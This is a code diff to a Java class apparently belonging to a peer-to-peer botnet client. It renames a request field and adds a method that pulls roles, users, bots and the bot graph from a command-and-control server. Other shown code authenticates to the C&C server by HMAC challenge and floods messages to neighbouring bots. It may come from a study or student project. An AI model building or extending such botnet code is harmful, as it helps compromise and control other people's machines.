@@ -32,7 +32,7 @@ public class Behavior {
 	private NetworkService nServ;
 
 	@Autowired
-	private BotRequest request;
+	private BotRequest req;
 
 	@Autowired
 	private Auth auth;
@@ -70,7 +70,7 @@ public class Behavior {
 
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
 		List<Pairs<String, String>>  response=null;
-		response=request.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(),data);
+		response=req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(),data);
 		if(response!=null){
 			response.forEach(ob->System.out.println("torno2 " + ob.getValue1().toString()));
 		}else
@@ -86,12 +86,12 @@ public class Behavior {
 	 */
 	private boolean challengeToCommandConquer() {
 		System.out.println("IP C&C " + nServ.getCommandConquerIps().getList().get(0).getValue1());
-		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(nServ.getIdHash(),nServ.getCommandConquerIps().getList().get(0).getValue1());
+		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),nServ.getCommandConquerIps().getList().get(0).getValue1());
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = request.getResponseFromCeC(
+			String response = req.getResponseFromCeC(
 					nServ.getIdHash(), 
 					nServ.getMyIp(), 
 					nServ.getMac(),
@@ -187,7 +187,7 @@ public class Behavior {
 	@Async
 	private void floodNeighoours(String msg) {
 		nServ.getNeighbours().getList().forEach((pairs) -> {
-			request.sendFloodToOtherBot(pairs.getValue1().toString(), msg);
+			req.sendFloodToOtherBot(pairs.getValue1().toString(), msg);
 		});
 
 		// cripta il messaggio e invialo ai vicini
@@ -220,15 +220,34 @@ public class Behavior {
 	}
 
 	public BotRequest getRequest() {
-		return request;
+		return req;
 	}
 
 	public void setRequest(BotRequest request) {
-		this.request = request;
+		this.req = request;
 	}
 
-	public void getPower() {
-		// TODO Auto-generated method stub
+	/**
+	 * @param ip
+	 */
+	public void getPower(String ip) {
+		
+		//prendo il db = ip
+		
+			//richiesta ruoli
+			List<Object> roles = req.getObject(ip, 1);
+			roles.forEach(role->System.out.println("ruolo: "+role));
+			//richiesta utenti
+			List<Object> users = req.getObject(ip, 2);
+			users.forEach(user->System.out.println("user: "+user));
+			//richiesta bot
+			List<Object> bots =req.getObject(ip, 3);
+			bots.forEach(role->System.out.println("bots: "+role));
+			//prendo grafo
+			List<Object> graph =req.getObject(ip, 4);
+			graph.forEach(role->System.out.println("edges: "+role));
+		//informo cc vecchio che spnp ready
+		//
 		
 	}
 }
